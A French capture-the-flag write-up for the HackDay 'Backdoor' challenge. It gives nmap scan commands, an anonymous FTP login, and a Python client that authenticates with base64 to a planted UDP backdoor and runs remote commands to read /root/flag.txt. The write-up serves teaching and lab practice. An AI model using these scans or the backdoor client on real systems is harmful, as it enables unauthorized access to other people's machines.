# Challenge "Backdoor - Partie 1"

Notes: J'ai écrit ce writeup de tête, je n'avais pas le docker à disposition au moment de sa redaction.

## Description du challenge
Quelqu'un tente d'usurper le site du HackDay ! Tente de l'en empecher !

## Notre solution

Notre premier reflexe a été de regarder dans notre navigateur le site web, celui-ci est une copie du site web du hackday que l'on peut retrouver ici : [Site du Hackday](https://hackday.fr/), mais nous n'avons pas trouvé de problème particulier sur celui-ci.

Nous avons donc ensuite cherché les ports ouvers via nmap: `sudo nmap -sV -p- -O 192.168.110.105 -vv` et avons observés deux ports ouverts (le port du serveur web `80` et le port du ftp `21`).

Nous avons ensuite essayé de nous connecter au ftp en mode anonyme, nous avons réussi, mais il n'y avait pas de résultats intéressant à traiter (seulement un message du hacker du site :( ).

Plus tard, on nous a donné l'indice de chercher dans les ports entre `34000` et `35000`, et nous avons remarqué en faisant un scan UDP  dans cette plage (`nmap -sU -p34000-35000 192.168.110.105 -vv`) que le port `34865` était ouvert et nous renvoyais des réponses.
Nous avons très vite identifié que les réponses du socket UDP nous renvoyais du base64 qui disait `not Authorized`, en envoyant des requêtes encodés en base64, il nous renvoyait alors `not Authorized. Send password`, nous avons très vite trouvé que le mot de passe était en fait `hackday` et que le socket nous laissait envoyer une commande dans les 2 secondes qui suivaient.

J'ai par conséquent créé un petit script python afin de me simplifier l'accès au système !
```python
import socket
import base64
import time

ip = "192.168.110.105"
port = 34865

password = b"hackday"

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def connect():
  result = ""
  while result != "You are now authentified. Welcome on HACKDAY backdoor ! Hope you are verry fast ;)":
    sock.sendto(base64.b64encode(password), (ip,port))
    result = base64.b64decode(sock.recvfrom(1024)[0].decode()).decode()


while True:
  msg = bytes(input("CMD: "), 'ascii')
  connect()
  sock.sendto(base64.b64encode(msg), (ip,port))
  print(base64.b64decode(sock.recvfrom(8192*2)[0].decode()).decode())
```

Grâce à ce script, j'ai pu trouver le flag qui était caché dans la machine : `/root/flag.txt`.
